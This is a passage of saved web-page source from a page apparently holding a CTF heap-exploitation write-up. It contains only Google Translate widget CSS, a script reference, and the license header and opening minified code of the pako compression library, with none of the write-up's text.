div{border-color:#CCC #999 #999 #CCC;border-right:1px solid #999;border-style:solid;border-width:1px;height:20px}.VIpgJd-ZVi9od-LgbsSe button{background:transparent;border:none;cursor:pointer;height:20px;overflow:hidden;margin:0;vertical-align:top;white-space:nowrap}.VIpgJd-ZVi9od-LgbsSe button:active{background:none repeat scroll 0 0 #CCC}.VIpgJd-ZVi9od-SmfZ{margin:0;background-color:#FFF;white-space:nowrap}.VIpgJd-ZVi9od-SmfZ-hSRGPd{text-decoration:none;font-weight:bold;font-size:10pt;border:1px outset #888;padding:6px 10px;white-space:nowrap;position:absolute;left:0;top:0}.VIpgJd-ZVi9od-SmfZ-hSRGPd img{margin-left:2px;margin-right:2px;width:19px;height:19px;border:none;vertical-align:middle}.VIpgJd-ZVi9od-SmfZ-hSRGPd span{text-decoration:underline;margin-left:2px;margin-right:2px;vertical-align:middle}.goog-te-float-top .VIpgJd-ZVi9od-SmfZ-hSRGPd{padding:2px;border-top-width:0}.goog-te-float-bottom .VIpgJd-ZVi9od-SmfZ-hSRGPd{padding:2px;border-bottom-width:0}.VIpgJd-ZVi9od-xl07Ob-lTBxed{text-decoration:none;color:#00C;white-space:nowrap;margin-left:4px;margin-right:4px}.VIpgJd-ZVi9od-xl07Ob-lTBxed span{text-decoration:underline}.VIpgJd-ZVi9od-xl07Ob-lTBxed img{margin-left:2px;margin-right:2px}.goog-te-gadget-simple .VIpgJd-ZVi9od-xl07Ob-lTBxed{color:#000}.goog-te-gadget-simple .VIpgJd-ZVi9od-xl07Ob-lTBxed span{text-decoration:none}.VIpgJd-ZVi9od-xl07Ob{background-color:#FFF;text-decoration:none;border:2px solid #C3D9FF;overflow-y:scroll;overflow-x:hidden;position:absolute;left:0;top:0}.VIpgJd-ZVi9od-xl07Ob-ibnC6b{padding:3px;text-decoration:none}.VIpgJd-ZVi9od-xl07Ob-ibnC6b,.VIpgJd-ZVi9od-xl07Ob-ibnC6b:link{color:#00C;background:#FFF}.VIpgJd-ZVi9od-xl07Ob-ibnC6b:visited{color:#551A8B}.VIpgJd-ZVi9od-xl07Ob-ibnC6b:hover{background:#C3D9FF}.VIpgJd-ZVi9od-xl07Ob-ibnC6b:active{color:#00C}.VIpgJd-ZVi9od-vH1Gmf{background-color:#FFF;text-decoration:none;border:1px solid #6B90DA;overflow:hidden;padding:4px}.VIpgJd-ZVi9od-vH1Gmf-KrhPNb{width:16px}.VIpgJd-ZVi9od-vH1Gmf-hgDUwe{margin:6px 0;height:1px;background-color:#aaa;overflow:hidden}.VIpgJd-ZVi9od-vH1Gmf-ibnC6b div,.VIpgJd-ZVi9od-vH1Gmf-ibnC6b-gk6SMd div{padding:4px}.VIpgJd-ZVi9od-vH1Gmf-ibnC6b .uDEFge{display:none}.VIpgJd-ZVi9od-vH1Gmf-ibnC6b-gk6SMd .uDEFge{display:auto}.VIpgJd-ZVi9od-vH1Gmf-ibnC6b-gk6SMd .fmcmS{padding-left:4px;padding-right:4px}.VIpgJd-ZVi9od-vH1Gmf-ibnC6b,.VIpgJd-ZVi9od-vH1Gmf-ibnC6b-gk6SMd{text-decoration:none}.VIpgJd-ZVi9od-vH1Gmf-ibnC6b div,.VIpgJd-ZVi9od-vH1Gmf-ibnC6b:link div,.VIpgJd-ZVi9od-vH1Gmf-ibnC6b:visited div,.VIpgJd-ZVi9od-vH1Gmf-ibnC6b:active div{color:#00C;background:#FFF}.VIpgJd-ZVi9od-vH1Gmf-ibnC6b:hover div{color:#FFF;background:#36C}.VIpgJd-ZVi9od-vH1Gmf-ibnC6b-gk6SMd div,.VIpgJd-ZVi9od-vH1Gmf-ibnC6b-gk6SMd:link div,.VIpgJd-ZVi9od-vH1Gmf-ibnC6b-gk6SMd:visited div,.VIpgJd-ZVi9od-vH1Gmf-ibnC6b-gk6SMd:hover div,.VIpgJd-ZVi9od-vH1Gmf-ibnC6b-gk6SMd:active div{color:#000;font-weight:bold}.VIpgJd-ZVi9od-l9xktf{background-color:#FFF;overflow:hidden;padding:8px;border:none;border-radius:10px}.VIpgJd-ZVi9od-l9xktf-OEVmcd{background-color:#FFF;border:1px solid #6B90DA;box-shadow:0 3px 8px 2px #999;border-radius:8px}.VIpgJd-ZVi9od-l9xktf img{border:none}.VIpgJd-ZVi9od-l9xktf-fmcmS{margin-top:6px}.VIpgJd-ZVi9od-l9xktf-VgwJlc{margin-top:6px;white-space:nowrap}.VIpgJd-ZVi9od-l9xktf-VgwJlc *{vertical-align:middle}.VIpgJd-ZVi9od-l9xktf-VgwJlc .DUGJie{background-image:url('https://www&google.com/images/zippy_minus_sm.gif')}.VIpgJd-ZVi9od-l9xktf-VgwJlc .TdyTDe{background-image:url('https://www&google.com/images/zippy_plus_sm.gif')}.VIpgJd-ZVi9od-l9xktf-VgwJlc span{color:#00C;text-decoration:underline;cursor:pointer;margin:0 4px}.VIpgJd-ZVi9od-l9xktf-I9GLp{margin:6px 0 0}.VIpgJd-ZVi9od-l9xktf-I9GLp form{margin:0}.VIpgJd-ZVi9od-l9xktf-I9GLp form textarea{margin-bottom:4px;width:100%}.VIpgJd-ZVi9od-l9xktf-yePe5c{margin:6px 0 4px}.VIpgJd-ZVi9od-aZ2wEe-wOHMyf{z-index:1000;position:fixed;transition-delay:.6s;left:-1000px;top:-1000px}.VIpgJd-ZVi9od-aZ2wEe-wOHMyf-ti6hGc{transition-delay:0s;left:-14px;top:-14px}.VIpgJd-ZVi9od-aZ2wEe-OiiCO{display:-moz-box;display:flex;-moz-box-align:center;align-items:center;-moz-box-pack:center;justify-content:center;width:104px;height:104px;border-radius:50px;background:#FFF url('https://www.gstatic.com/images/branding/product/2x/translate_24dp.png') 50% 50% no-repeat;transition:all .6s ease-in-out;transform:scale(.4);opacity:0}.VIpgJd-ZVi9od-aZ2wEe-OiiCO-ti6hGc{transform:scale(.5);opacity:1}.VIpgJd-ZVi9od-aZ2wEe{margin:2px 0 0 2px;animation:spinner-rotator 1.4s linear infinite}@keyframes spinner-rotator{0%{transform:rotate(0deg)}100%{transform:rotate(270deg)}}.VIpgJd-ZVi9od-aZ2wEe-Jt5cK{stroke-dasharray:187;stroke-dashoffset:0;stroke:#4285F4;transform-origin:center;animation:spinner-dash 1.4s ease-in-out infinite}@keyframes spinner-dash{0%{stroke-dashoffset:187}50%{stroke-dashoffset:46.75;transform:rotate(135deg)}100%{stroke-dashoffset:187;transform:rotate(450deg)}}.VIpgJd-yAWNEb-L7lbkb html,.VIpgJd-yAWNEb-L7lbkb body,.VIpgJd-yAWNEb-L7lbkb div,.VIpgJd-yAWNEb-L7lbkb span,.VIpgJd-yAWNEb-L7lbkb iframe,.VIpgJd-yAWNEb-L7lbkb h1,.VIpgJd-yAWNEb-L7lbkb h2,.VIpgJd-yAWNEb-L7lbkb h3,.VIpgJd-yAWNEb-L7lbkb h4,.VIpgJd-yAWNEb-L7lbkb h5,.VIpgJd-yAWNEb-L7lbkb h6,.VIpgJd-yAWNEb-L7lbkb p,.VIpgJd-yAWNEb-L7lbkb a,.VIpgJd-yAWNEb-L7lbkb img,.VIpgJd-yAWNEb-L7lbkb ol,.VIpgJd-yAWNEb-L7lbkb ul,.VIpgJd-yAWNEb-L7lbkb li,.VIpgJd-yAWNEb-L7lbkb table,.VIpgJd-yAWNEb-L7lbkb form,.VIpgJd-yAWNEb-L7lbkb tbody,.VIpgJd-yAWNEb-L7lbkb tr,.VIpgJd-yAWNEb-L7lbkb td{margin:0;padding:0;border:0;font:inherit;font-size:100%;vertical-align:baseline;text-align:left;line-height:normal}.VIpgJd-yAWNEb-L7lbkb ol,.VIpgJd-yAWNEb-L7lbkb ul{list-style:none}.VIpgJd-yAWNEb-L7lbkb table{border-collapse:collapse;border-spacing:0}.VIpgJd-yAWNEb-L7lbkb caption,.VIpgJd-yAWNEb-L7lbkb th,.VIpgJd-yAWNEb-L7lbkb td{text-align:left;font-weight:normal}.VIpgJd-yAWNEb-L7lbkb input::-moz-focus-inner{border:0}div>.VIpgJd-yAWNEb-L7lbkb{padding:10px 14px}.VIpgJd-yAWNEb-L7lbkb{color:#222;background-color:#fff;border:1px solid #eee;box-shadow:0 4px 16px rgba(0,0,0,.2);-moz-box-shadow:0 4px 16px rgba(0,0,0,.2);-webkit-box-shadow:0 4px 16px rgba(0,0,0,.2);display:none;font-family:arial;font-size:10pt;width:420px;padding:12px;position:absolute;z-index:10000}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-nVMfcd-fmcmS,.VIpgJd-yAWNEb-yAWNEb-Vy2Aqc-pbTTYe{clear:both;font-size:10pt;position:relative;text-align:justify;width:100%}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-r4nke{color:#999;font-family:arial,sans-serif;margin:4px 0;text-align:left}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-TvD9Pc-LgbsSe{display:none}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-l4eHX{float:left;margin:0}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-Z0Arqf-PLDbbf{display:inline-block}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-fw42Ze-Z0Arqf-haAclf{display:none;width:100%}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-Z0Arqf-H9tDt{margin-top:20px}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-LK5yu{float:left}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-qwU8Me{float:right}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-cGMI2b{min-height:15px;position:relative;height:1%}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-jOfkMb-Ne3sFf{background:linear-gradient(top,#29910d 0,#20af0e 100%);background:#29910d;border-radius:4px;-moz-border-radius:4px;-webkit-border-radius:4px;box-shadow:inset 0 2px 2px #1e6609;-moz-box-shadow:inset 0 2px 2px #1e6609;-webkit-box-shadow:inset 0 2px 2px #1e6609;color:white;font-size:9pt;font-weight:bolder;margin-top:12px;padding:6px;text-shadow:1px 1px 1px #1e6609}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-Z0Arqf-hSRGPd{color:#15c;cursor:pointer;font-family:arial;font-size:11px;margin-right:15px;text-decoration:none}.VIpgJd-yAWNEb-L7lbkb>textarea{font-family:arial;resize:vertical;width:100%;margin-bottom:10px;border-radius:1px;border:1px solid #d9d9d9;border-top:1px solid silver;font-size:13px;height:auto;overflow-y:auto;padding:1px}.VIpgJd-yAWNEb-L7lbkb textarea:focus{box-shadow:inset 0 1px 2px rgba(0,0,0,.3);border:1px solid #4d90fe;outline:none}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-Z0Arqf-IbE0S{margin-right:10px}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp{min-height:25px;vertical-align:middle;padding-top:8px}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp{margin-bottom:5px;margin-bottom:0}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp input{display:inline-block;min-width:54px;*min-width:70px;border:1px solid #dcdcdc;border:1px solid rgba(0,0,0,.1);text-align:center;color:#444;font-size:11px;font-weight:bold;height:27px;outline:0;padding:0 8px;vertical-align:middle;line-height:27px;margin:0 16px 0 0;box-shadow:0 1px 2px rgba(0,0,0,.1);-moz-box-shadow:0 1px 2px rgba(0,0,0,.1);-webkit-box-shadow:0 1px 2px rgba(0,0,0,.1);border-radius:2px;transition:all .218s;background-color:#f5f5f5;background-image:linear-gradient(top,#f5f5f5,#f1f1f1);-webkit-user-select:none;-moz-user-select:none;cursor:default}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp input:hover{border:1px solid #c6c6c6;color:#222;transition:all 0s;background-color:#f8f8f8;background-image:linear-gradient(top,#f8f8f8,#f1f1f1)}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp input:active{border:1px solid #c6c6c6;color:#333;background-color:#f6f6f6;background-image:linear-gradient(top,#f6f6f6,#f1f1f1)}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp input:focus .VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp input.AHmuwe .VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp input:active,.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp input:focus:active{box-shadow:inset 0 0 0 1px rgba(255,255,255,.5);-webkit-box-shadow:inset 0 0 0 1px rgba(255,255,255,.5);-moz-box-shadow:inset 0 0 0 1px rgba(255,255,255,.5)}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp input:focus,.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp input.AHmuwe{outline:none;border:1px solid #4d90fe;z-index:4!important}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp input.gk6SMd{background-color:#eee;background-image:linear-gradient(top,#eee,#e0e0e0);box-shadow:inset 0 1px 2px rgba(0,0,0,.1);border:1px solid #ccc;color:#333}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp input .VIpgJd-yAWNEb-Z0Arqf-sFeBqf{color:white;border-color:#3079ed;background-color:#4d90fe;background-image:linear-gradient(top,#4d90fe,#4787ed)}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp input .VIpgJd-yAWNEb-Z0Arqf-sFeBqf:hover .VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp input .VIpgJd-yAWNEb-Z0Arqf-sFeBqf:focus,.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp input .VIpgJd-yAWNEb-Z0Arqf-sFeBqf.AHmuwe .VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp input .VIpgJd-yAWNEb-Z0Arqf-sFeBqf:active{border-color:#3079ed;background-color:#357ae8;background-image:linear-gradient(top,#4d90fe,#357ae8)}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp input .VIpgJd-yAWNEb-Z0Arqf-sFeBqf:hover{box-shadow:inset 0 0 0 1px #fff,0 1px 1px rgba(0,0,0,.1);-webkit-box-shadow:inset 0 0 0 1px #fff,0 1px 1px rgba(0,0,0,.1);-moz-box-shadow:inset 0 0 0 1px #fff,0 1px 1px rgba(0,0,0,.1)}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp input:focus,.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp input.AHmuwe,.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp input:active,.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp input:hover,.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp input .VIpgJd-yAWNEb-Z0Arqf-sFeBqf:focus,.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp input .VIpgJd-yAWNEb-Z0Arqf-sFeBqf.AHmuwe,.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp input .VIpgJd-yAWNEb-Z0Arqf-sFeBqf:active,.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-L4Nn5e-I9GLp .VIpgJd-yAWNEb-Z0Arqf-I9GLp input .VIpgJd-yAWNEb-Z0Arqf-sFeBqf:hover{border-color:#3079ed}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-mrxPge{color:#999;font-family:arial,sans-serif}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-IFdKyd-W0vJo-fmcmS{color:#999;font-size:11px;font-family:arial,sans-serif;margin:15px 0 5px}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-IFdKyd-u0pjoe-fmcmS{color:#800;display:none;font-size:9pt}.VIpgJd-yAWNEb-VIpgJd-fmcmS-sn54Q{background-color:#c9d7f1;box-shadow:2px 2px 4px #99a;box-sizing:border-box;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;position:relative}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-IFdKyd-xl07Ob .VIpgJd-yAWNEb-VIpgJd-xl07Ob{background:#fff;border:1px solid #ddd;box-shadow:0 2px 4px #99a;min-width:0;outline:none;padding:0;position:absolute;z-index:2000}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-IFdKyd-xl07Ob .VIpgJd-yAWNEb-VIpgJd-j7LFlb{cursor:pointer;padding:2px 5px 5px;margin-right:0;border-style:none}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-IFdKyd-xl07Ob .VIpgJd-yAWNEb-VIpgJd-j7LFlb:hover{background:#ddd}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-IFdKyd-xl07Ob .VIpgJd-yAWNEb-VIpgJd-j7LFlb h1{font-size:100%;font-weight:bold;margin:4px 0}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-IFdKyd-xl07Ob .VIpgJd-yAWNEb-VIpgJd-j7LFlb strong{color:#345aad}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-VIpgJd-eKm5Fc-hFsbo{text-align:right;position:absolute;right:0;left:auto}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-VIpgJd-j7LFlb-SIsrTd .VIpgJd-yAWNEb-VIpgJd-eKm5Fc-hFsbo{text-align:left;position:absolute;left:0;right:auto}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-yAWNEb-Vy2Aqc-fmcmS,.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-TVLw9c-ppHlrf-sn54Q{background-color:#f1ea00;border-radius:4px;-webkit-border-radius:4px;-moz-border-radius:4px;box-shadow:rgba(0,0,0,.5) 3px 3px 4px;box-sizing:border-box;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;color:#f1ea00;cursor:pointer;margin:-2px -2px -2px -3px;padding:2px 2px 2px 3px;position:relative}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-TVLw9c-ppHlrf-sn54Q{color:#222}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-yAWNEb-Vy2Aqc-pbTTYe{color:white;position:absolute!important}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-TVLw9c-ppHlrf,.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-TVLw9c-ppHlrf .VIpgJd-yAWNEb-TVLw9c-ppHlrf-sn54Q{background-color:#c9d7f1;border-radius:4px 4px 0 0;-webkit-border-radius:4px 4px 0 0;-moz-border-radius:4px 4px 0 0;box-shadow:rgba(0,0,0,.5) 3px 3px 4px;box-sizing:border-box;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;cursor:pointer;margin:-2px -2px -2px -3px;padding:2px 2px 3px 3px;position:relative}.VIpgJd-yAWNEb-L7lbkb span:focus{outline:none}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-TVLw9c-DyVDA{background-color:transparent;border:1px solid #4d90fe;border-radius:0;-webkit-border-radius:0;-moz-border-radius:0;margin:-2px;padding:1px}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-yAWNEb-TVLw9c-sn54Q-LzX3ef{border-left:2px solid red;margin-left:-2px}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-yAWNEb-TVLw9c-sn54Q-YIAiIb{border-right:2px solid red;margin-right:-2px}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-IFdKyd-YPqjbf{padding:2px}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-IFdKyd-YPqjbf-fmcmS{font-size:11px;padding:2px 2px 3px;margin:0;background-color:#fff;color:#333;border:1px solid #d9d9d9;border-top:1px solid #c0c0c0;display:inline-block;vertical-align:top;height:21px;box-sizing:border-box;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;-webkit-border-radius:1px}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-IFdKyd-YPqjbf-fmcmS:hover{border:1px solid #b9b9b9;border-top:1px solid #a0a0a0;box-shadow:inset 0 1px 2px rgba(0,0,0,.1)}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-IFdKyd-YPqjbf-fmcmS:focus{box-shadow:inset 0 1px 2px rgba(0,0,0,.3);outline:none;border:1px solid #4d90fe}.VIpgJd-yAWNEb-L7lbkb .VIpgJd-yAWNEb-IFdKyd-YPqjbf-sFeBqf{font-size:11px;padding:2px 6px 3px;margin:0 0 0 2px;height:21px}.VIpgJd-yAWNEb-hvhgNd{font-family:"Google Sans",Arial,sans-serif}.VIpgJd-yAWNEb-hvhgNd .VIpgJd-yAWNEb-hvhgNd-l4eHX-i3jM8c{position:absolute;top:10px;left:14px}.VIpgJd-yAWNEb-hvhgNd .VIpgJd-yAWNEb-hvhgNd-l4eHX-SIsrTd{position:absolute;top:10px;right:14px}.VIpgJd-yAWNEb-hvhgNd .VIpgJd-yAWNEb-hvhgNd-k77Iif-i3jM8c,.VIpgJd-yAWNEb-hvhgNd .VIpgJd-yAWNEb-hvhgNd-k77Iif-SIsrTd{margin:16px;padding:0}.VIpgJd-yAWNEb-hvhgNd .VIpgJd-yAWNEb-hvhgNd-IuizWc{margin:0 0 0 36px;padding:0;color:#747775;font-size:14px;font-weight:500}.VIpgJd-yAWNEb-hvhgNd .VIpgJd-yAWNEb-hvhgNd-k77Iif-SIsrTd .VIpgJd-yAWNEb-hvhgNd-IuizWc{text-align:right;margin:0 36px 0 0}.VIpgJd-yAWNEb-hvhgNd .VIpgJd-yAWNEb-hvhgNd-axAV1{width:auto;padding:12px 0 0;color:#1f1f1f;font-size:16px;text-align:initial}.VIpgJd-yAWNEb-hvhgNd .VIpgJd-yAWNEb-hvhgNd-axAV1 .VIpgJd-yAWNEb-SIsrTd{text-align:right}.VIpgJd-yAWNEb-hvhgNd .VIpgJd-yAWNEb-hvhgNd-N7Eqid{border-radius:0 0 12px 12px;margin:0;background:#f1f4f9;position:relative;min-height:50px}.VIpgJd-yAWNEb-hvhgNd .VIpgJd-yAWNEb-hvhgNd-N7Eqid .VIpgJd-yAWNEb-SIsrTd{text-align:right}.VIpgJd-yAWNEb-hvhgNd .VIpgJd-yAWNEb-hvhgNd-N7Eqid-B7I4Od{display:inline-block;width:77%;padding:12px}.VIpgJd-yAWNEb-hvhgNd .VIpgJd-yAWNEb-hvhgNd-N7Eqid-B7I4Od .VIpgJd-yAWNEb-SIsrTd{text-align:right}.VIpgJd-yAWNEb-hvhgNd .VIpgJd-yAWNEb-hvhgNd-UTujCb{color:#1f1f1f;font-size:12px;font-weight:500}.VIpgJd-yAWNEb-hvhgNd .VIpgJd-yAWNEb-hvhgNd-N7Eqid-B7I4Od .VIpgJd-yAWNEb-SIsrTd .VIpgJd-yAWNEb-hvhgNd-UTujCb{text-align:right}.VIpgJd-yAWNEb-hvhgNd .VIpgJd-yAWNEb-hvhgNd-eO9mKe{color:#444746;font-size:12px;padding-top:4px}.VIpgJd-yAWNEb-hvhgNd .VIpgJd-yAWNEb-hvhgNd-N7Eqid-B7I4Od .VIpgJd-yAWNEb-SIsrTd .VIpgJd-yAWNEb-hvhgNd-eO9mKe{text-align:right}.VIpgJd-yAWNEb-hvhgNd .VIpgJd-yAWNEb-hvhgNd-xgov5{position:absolute;top:10px;right:5px}.VIpgJd-yAWNEb-hvhgNd .VIpgJd-yAWNEb-hvhgNd-xgov5 .VIpgJd-yAWNEb-SIsrTd{left:5px;right:auto}.VIpgJd-yAWNEb-hvhgNd .VIpgJd-yAWNEb-hvhgNd-THI6Vb{fill:#0b57d0}.VIpgJd-yAWNEb-hvhgNd .VIpgJd-yAWNEb-hvhgNd-bgm6sf{margin:-4px 2px 0 0;padding:2px 0 0;width:48px;height:48px;border:none;border-radius:24px;cursor:pointer;background:none}.VIpgJd-yAWNEb-hvhgNd .VIpgJd-yAWNEb-hvhgNd-bgm6sf:hover{background:#e8ebec}.VIpgJd-yAWNEb-hvhgNd .VIpgJd-yAWNEb-hvhgNd-aXYTce{display:none}sentinel{}</style><style class="darkreader darkreader--sync" media="screen"></style><script type="text/javascript" charset="UTF-8" src="[Writeup]%20LazyFragmentationHeap%20-%20WCTF%202019%20NULL@ROOT_files/m=el_main"></script><script>/**
 * @license
 * pako 1.0.6 nodeca/pako
 * Copyright (C) 2014-2017 by Vitaly Puzrin and Andrei Tuputcyn
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * Ported from zlib 1.2.8
 * Copyright (C) 1995-2013 Jean-loup Gailly and Mark Adler
 *
 * This software is provided 'as-is', without any express or implied
 * warranty.  In no event will the authors be held liable for any damages
 * arising from the use of this software.
 *
 * Permission is granted to anyone to use this software for any purpose,
 * including commercial applications, and to alter it and redistribute it
 * freely, subject to the following restrictions:
 *
 * 1. The origin of this software must not be misrepresented; you must not
 *    claim that you wrote the original software. If you use this software
 *    in a product, an acknowledgment in the product documentation would be
 *    appreciated but is not required.
 * 2. Altered source versions must be plainly marked as such, and must not be
 *    misrepresented as being the original software.
 * 3. This notice may not be removed or altered from any source distribution.
 *
 * Jean-loup Gailly        Mark Adler
 * jloup@gzip.org          madler@alumni.caltech.edu
 */
!function(t){if("object"==typeof exports&&"undefined"!=typeof module)module.exports=t();else if("function"==typeof define&&define.amd)define([],t);else{("undefined"!=typeof window?window:"undefined"!=typeof global?global:"undefined"!=typeof self?self:this).pako=t()}}(function(){return function t(e,a,i){function n(s,o){if(!a[s]){if(!e[s]){var l="function"==typeof require&&require;if(!o&&l)return l(s,!0);if(r)return r(s,!0);var h=new Error("Cannot find module '"+s+"'");throw h.code="MODULE_NOT_FOUND",h}var d=a[s]={exports:{}};e[s][0].call(d.exports,function(t){var a=e[s][1][t];return n(a||t)},d,d.exports,t,e,a,i)}return a[s].exports}for(var r="function"==typeof require&&require,s=0;s<i.length;s++)n(i[s]);return n}({1:[function(t,e,a){"use strict";function i(t){if(!(this instanceof i))return new i(t);this.options=s.assign({level:_,method:c,chunkSize:16384,windowBits:15,memLevel:8,strategy:u,to:""},t||{});var e=this.options;e.raw&&e.windowBits>0?e.windowBits=-e.windowBits:e.gzip&&e.windowBits>0&&e.windowBits<16&&(e.windowBits+=16),this.err=0,this.msg="",this.ended=!1,this.chunks=[],this.strm=new h,this.strm.avail_out=0;var a=r.deflateInit2(this.strm,e.level,e.method,e.windowBits,e.memLevel,e.strategy);if(a!==f)throw new Error(l[a]);if(e.header&&r.deflateSetHeader(this.strm,e.header),e.dictionary){var n;if(n="string"==typeof e.dictionary?o.string2buf(e.dictionary):"[object ArrayBuffer]"===d.call(e.dictionary)?new 